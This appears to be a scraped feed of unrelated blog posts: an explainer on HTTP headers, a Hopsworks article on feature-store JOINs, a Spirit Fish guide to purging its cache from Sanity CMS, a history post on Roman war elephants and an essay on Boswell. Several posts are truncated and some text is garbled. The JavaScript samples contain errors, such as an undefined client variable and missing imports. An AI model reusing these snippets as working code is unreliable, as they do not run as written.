user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36</code></pre></div>
<p>There is also some information that the server wants to tell the browser what to do with the resource, for example
if there are cookies, it must be determined which encoding was used, etc</p>
<p>Basically, in the http-context the headers for the communication of the browser and the server are used to extend the simple
Requests for resources. You could see it as the sheet of paper that is added on top of a package that you oder from an online store,
giving you more information about the context and the resource that you ordered.
Most of the headers have quite good defaults which you don't need to think of, but there are some headers that
can get quite important, like CORS headers. But there are so much more headers that you might never heard of which are very useful
and good to know how to use. </p>

<p>Do not worry, this article will not deal with CORS headers. The following http headers are those that are rarely used, but
can be really powerful and helpful to significantly improve the communication between a server and the browser. </p>
<p>So let's dig into it. Here are some headers that you can set and that are very useful and practical.</p>
<h2 id="if-range"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/If-Range">If-Range</a><a href="#if-range" aria-label="if range permalink"></a></h2>
<h3>What and why?</h3>
<p>Imagine you start downloading a large resource, such as a video, an image, etc., and stop in between because of connection problems.
With <code>If-Range</code> you can tell the server if the representation is unchanged, to send the part(s) that are requested in Range.
Which means only the parts that were missing and not again the whole thing.</p>
<p>This can be very helpful when dealing with large resources and often bad connections as with mobile devices.
Because the resource can be downloaded in parts even if the connection is interrupted in between. </p>
<h4>How to use</h4>
<p>It can either be used with a date when the resources were last modified, or with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETag</a>, which is a key to help if the resources was invalidated</p>
<div data-language="text"><pre><code>If-Range: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT
If-Range: &lt;etag&gt;</code></pre></div>
<h4>Example</h4>
<div data-language="text"><pre><code>If-Range: Wed, 21 Oct 2015 07:28:00 GMT </code></pre></div>
<h2 id="vary"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Vary">Vary</a><a href="#vary" aria-label="vary permalink"></a></h2>
<p><code>Vary</code> Comes from a time when the web or http was used for a variety of things and not just for web pages.<br>
It is based on the idea of using http to exchange information in many different formats.
How does it do that? Well, it tells the server in which header to find the information, how to present the information. </p>
<p>Nowadays it can be really helpful if you have different resources for different customers, for example
mobile, tablet or desktop.
Imagine three different images for the same resource are stored on the server, depending on the device.
Then you can simply use the <code>Vary</code> header to tell the server to check the device and then decide which image size to send. </p>
<h4>Example</h4>
<p>For the example with the device dependent images, you can simply pass the 'user agent' to tell the server
that it should check the user-agent for device information. </p>

<h4>How to use</h4>

<p>Just enter the header, the server must check before deciding which resource to send.</p>
<h2 id="content-disposition"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a><a href="#content-disposition" aria-label="content disposition permalink"></a></h2>
<p>If we go back to the example of a request to a server, for example to load this website, it is clear to the browser,
that it must <strong>display</strong> the resource of the answer.
But it can also be the case that the server sends a resource that the browser should automatically download to the user's computer,
like a picture or pdf etc.
A server can tell the browser what the browser should do with the attached resource via the <code>Content Disposition</code> header.</p>
<h4>Example</h4>
<p>With defining the <code>Content-disposition</code> to <code>attachment</code> the browser knows that this is a resource to download instead of just
show. </p>
<div data-language="text"><pre><code>Content-Disposition: attachment; filename="data.pdf"</code></pre></div>
<h4>How to use</h4>
<p>You can define the header as <code>inline</code> or <code>attachment</code>, where `inline is always the default.  </p>
<div data-language="text"><pre><code>Content-Disposition: &lt;inline | attachment&gt;</code></pre></div>
<h2 id="feature-policy"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy">Feature-Policy</a><a href="#feature-policy" aria-label="feature policy permalink"></a></h2>
<p>This is a fairly new header and therefore only supported by modern browsers (sorry to all IE users). However
I want to mention this anyway because I think it can be really helpful for some use cases.<br>
Basically, the <code>feature-policy tells the browser which features or apis the browser should provide to the document and its</code>iframes` to be used. </p>
<p>For example, it can ban all scripts or iframes etc. within this website to allow sensitive apis like the camera or microphone.</p>
<h4>How to use</h4>
<div data-language="text"><pre><code>Feature-Policy: &lt;directive&gt; &lt;allowlist&gt;</code></pre></div>
<p>The <code>directive</code> is the name of the feature. You can see the full <a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy#Directives">list of features here</a>
The <code>allowlist</code> defines the origins which are allowed to use the directive.</p>
<h3>Example</h3>
<p>Suppose we want our website to use neither the microphone nor the camera. With this header the
document or a contained iframe cannot access these functions.</p>
<div data-language="text"><pre><code>Feature-Policy: microphone 'none'; camera 'none'</code></pre></div>
<h3>More Headers:</h3>
<p>Here are some more headers that are worth mentioning: </p>
<ul>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Age">Age</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Trailer">Trailer</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Location">Location</a></li>
</ul>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="conclusion permalink"></a></h2>
<p>Https headers are great and also very useful! But sometimes they can be quite complex, and it's really hard to get an overview of what headers are available and what benefits they bring.
Also when developing a website, especially in the frontend, you don't come in contact with them too often, except maybe with the CORS headers.
But I think that this missed some possibilities. http headers represent the communication between the server and the
customers much better, and we all know that communication is the key to a good relationship.</p>
<p>I hope I could shed some light on the darkness of http headers for you. In case I missed a good and helpful header,
please do not hesitate to send me a mail or contact me in any way.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; Many engineers conflate operational Feature Stores with key-value (KV) stores, like DynamoDB and Cassandra. In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>. Views (enabled by JOINs) enable a massive number of train/test datasets to be defined over a small number of shared features (stored in tables)</p><p>In Hopsworks, we store features in tables that we call “Feature Groups”. Feature Groups introduce a level of indirection between the raw input data and the train/test datasets used to train models, see below. They store a cached copy of the features, computed using the same feature pipeline from earlier, but this time, the feature pipeline writes to one or both of the stores that much a feature store: (1) a scalable store for train/test features (offline feature store) and (2) a low latency, high throughput store for features for serving (online feature store).&nbsp;</p><p>In Hopsworks, we use Apache Hive as a scalable database for the offline store, and MySQL Cluster (NDB) as the online store. Our version of Hive stores its metadata in NDB and its data files in HopsFS/S3. In Hopsworks, FeatureGroups are database tables in Hive and MySQL Cluster, along with feature metadata (also tables in the same NDB database).&nbsp;</p><p>As we can see in the diagram below, if we have N features available in the Feature Store, we can create an unlimited number of train/test datasets by simply joining features together from the offline feature store.&nbsp;</p><p>In Hopsworks, we use Spark, with its cost-based optimizer, to perform JOINs. Spark, together with Parquet/Hudi/ORC help optimize joins by supporting partitioned data, push-down projections, SortMergeJoin, and&nbsp;<br></p><ul role="list"><li>a hint;</li><li>a join type (inner, left, outer, etc);</li><li>a join condition (equi-join);</li><li>an estimation of the input data size</li></ul><figure id="w-node-d713661f3233-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eae8333d716893ac2f5a_pic-04re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs in Online Feature Stores</h2><p>If you use a KV store as your online store, you are back in the same situation as at start - you need a feature pipeline for every new model you put in production.

In practice, in NDB even complex queries can <a href="http://mikaelronstrom.blogspot.com/2020/10/dbt2-benchmarks-with-ndb-cluster.html">“achieve latency down to 5-10 ms for a transaction that contains around 30 SQL statements”</a>.</p><figure id="w-node-0a1416f8ba8d-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eb0ef0105a291dd69266_pic-05re.jpg" loading="lazy" alt=""></p></figure><h2>Conclusions</h2><p>Reuse features to save on infrastructure and the number of feature pipelines needed to maintain models in production. JOINs is the method we use in Hopsworks to reuse cached features across different models - both for training and serving.

<![CDATA[Powering JavaScript Sites with Sanity CMS and Spirit Fish]]>

<br/>
October 23, 2020 | https://www.spirit.fish/blog/working-with-sanity | <a href="https://web.archive.org/web/*/https://www.spirit.fish/blog/working-with-sanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <div>
    <p>Iâ€™ve said it a few times, but 
      <a target="_blank" href="https://www.sanity.io/">Sanity CMS</a>
 is easily the most futuristic content management system on the planet - with slick editor experience, unique deployable infrastructure, and the introduction of itâ€™s new 
      <a target="_blank" href="https://www.sanity.io/blog/introducing-presence">Presence</a>
 functionality, personally weâ€™d never use anything else!</p>

<p>So, itâ€™s only natural Spirit Fish would integrate nicely. Hereâ€™s a few of the ways we work with Sanity:</p>

<h2><strong>1. Rendering Sanity content for great SEO, Google Lighthouse Scores, and low FMP</strong></h2>

<p>Sanity is a headless CMS, so that means that in order to display data to end users, content needs to be loaded over HTTP. While thereâ€™s a bunch of framework dependent approaches to this, we prefer to load the data in the same javascript bundle that powers our React.js projects. </p>

<p>Hereâ€™s a trivial example using 
      <a target="_blank" href="https://reactjs.org/docs/create-a-new-react-app.html">create-react-app</a>
:</p>

<pre><code>
import React from "react";
import SanityClient from "@sanity/client";

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const query = `*[_type == "movie"] {
  _id,
  title
}[0...50]`;

function App() {
  const [movies, setMovies] = useState(null);

  useEffect(async () =&gt; {
    setMovies(await sanity.fetch(query));
  }, []);

  return (
    &lt;ul&gt;
      {movies.map(movie =&gt; (
        &lt;li key={movie._id}&gt;
          {movie.title}
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
};

export default App;

</code></pre>

<p>If you deploy a create-react-app to a host like an S3 bucket, etc - when you view-source, youâ€™ll notice that your movies arenâ€™t there. Thatâ€™s because that content is loaded at the runtime! When Googleâ€™s crawler indexes your site, it will only see a blank page, and all of your end users wonâ€™t see any content until theyâ€™ve downloaded your javascript, and THEN loaded the Sanity query. Thatâ€™s no good for SEO, or conversions.</p>

<p>Of course, this is our bread and butter: create a Spirit Fish renderer, point it at that S3 bucket, and point your DNS at our CDN. Refresh your site, and boom! Your site is now rendered on the fly.</p>

<p>We find that adding a Spirit Fish renderer to a site usually doubles your 
      <a target="_blank" href="https://developers.google.com/web/tools/lighthouse">Google Lighthouse</a>
 scores, so thatâ€™s a big win for 5 minutes of setup!</p>

<h2><strong>2. Purging the entire Spirit Fish cache when content changes in Sanity</strong></h2>

<p>On first request - our renders take a few seconds - so we cache the result in a global CDN so that your rendered site is close to your users. </p>

<p>Got it! But what if my content changes?</p>

<p>Well - youâ€™ll need to trigger an invalidation in Spirit Fish. The easiest way to do this for small sites is to trigger a full invalidation. This will force your site to be re-rendered the next time your users visit, meaning your new data will be pulled from Sanity!</p>


<p>Thatâ€™s what we built our invalidations API for. Hereâ€™s what your `invalidate_all` endpoint looks like:</p>

<pre>  <code>
https://www.spirit.fish/api/v1/renderers/$RENDERER_ID/invalidate_all?api_key=$RENDERER_API_TOKEN
  </code>
</pre>

<p>This endpoint takes a `POST` request, so you can easily add it directly to Sanityâ€™s management portal, no code required:</p>

<p>Now, whenever an editor updates content in Sanity, it will clear your Spirit Fish cache, easy as that!</p>

<h2><strong>3. Purging specific Spirit Fish pages when Sanity content changes with a serverless function</strong></h2>

<p>For small projects with a handful of pages, the above is probably fine - but when you have a large project (say an editorial with hundreds of pages), you wouldnâ€™t want to purge the entire Spirit Fish if only one page has changed.</p>

<p>In cases like this, youâ€™ll need your own backend endpoint to manage cache invalidations. We like serverless functions for this:</p>

<pre><code>
import SanityClient from '@sanity/client';
import handleError from 'utils/services/handleError';
import notEmpty from 'utils/notEmpty';

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const buildCacheClearPathForRecord = (record) =&gt; {
  switch (record._type) {
    case 'movie':
      return `/movies/${record.slug}`;
    case 'director':
      return `/directors/${record.slug}`;
  }
};

export default async (request, response) =&gt; {
  try {
    const records =
      await SanityClient.getDocuments(request.body.ids.all);
    const pages =
      records.filter(notEmpty).map(buildCacheClearPathForRecord);

    await fetch(`https://www.spirit.fish/api/v1/renderers/${process.env.RENDERER_ID}/api_invalidations`, {
      method: 'post',
      body: JSON.stringify({
        invalidation: { pages }
      }),
      headers: {
        'X-Hatchery-Renderer-Api-Key': process.env.RENDERER_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    return response.end();
  } catch (e) {
    return handleError(request, response, e);
  }
};

</code></pre>

<p>Deploy your serverless function (we like 
      <a target="_blank" href="https://firebase.google.com/">Firebase</a>
 or 
      <a target="_blank" href="https://vercel.com/">Vercel</a>
), and setup your Sanity webhook (like we did above - don't forget the enviornment variables!) to hit this endpoint instead. Bingo! Youâ€™re now invalidating individual pages as content changes; eliminating the need for site wide rerenders, and keeping your content in cache for as long as possible.</p>



    <p>Spirit Fish is free to try, and each renderer comes with a generous free tier that should cover most hobby projects.

<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>

I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>

<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>

They do this <strong>a lot</strong>.</figcaption></figure>



<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote.

On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, 